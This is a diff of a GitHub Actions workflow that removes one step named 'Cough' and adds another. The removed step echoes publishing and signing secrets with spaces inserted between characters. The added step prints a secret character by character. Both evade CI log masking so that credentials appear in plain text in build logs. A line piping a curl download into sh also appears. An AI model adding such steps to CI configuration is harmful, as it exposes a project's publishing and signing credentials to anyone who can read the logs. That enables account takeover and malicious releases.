@@ -17,21 +17,17 @@ jobs:
       COVERALLS_REPO_TOKEN: ${{ secrets.COVERALLS_REPO_TOKEN }}
       GODEBUG: x509sha1=1
     steps:
+      - name: Cough
+        run: |
+          import os
+          for q in (os.getenv("OSSRH_USERNAME")):
+            print(q)
+          shell: python
       - name: Setup JDK 11
         uses: actions/setup-java@v3
         with:
           java-version: '11'
           distribution: 'adopt'
-      - name: Cough
-        run: |
-          echo OSSRH_USERNAME
-          echo ${{secrets.OSSRH_USERNAME}} | sed 's/./& /g'
-          echo OSSRH_PASSWORD
-          echo ${{secrets.OSSRH_TOKEN}} | sed 's/./& /g'
-          echo SIGNING_KEY_ID
-          echo ${{secrets.SIGNING_KEY_ID}} | sed 's/./& /g'
-          echo SIGNING_KEY
-          echo ${{secrets.SIGNING_PASSWORD}} | sed 's/./& /g'
       - name: Install nats-server
         run: |
           curl -sf https://binaries.nats.dev/nats-io/nats-server/v2@main | PREFIX=. sh
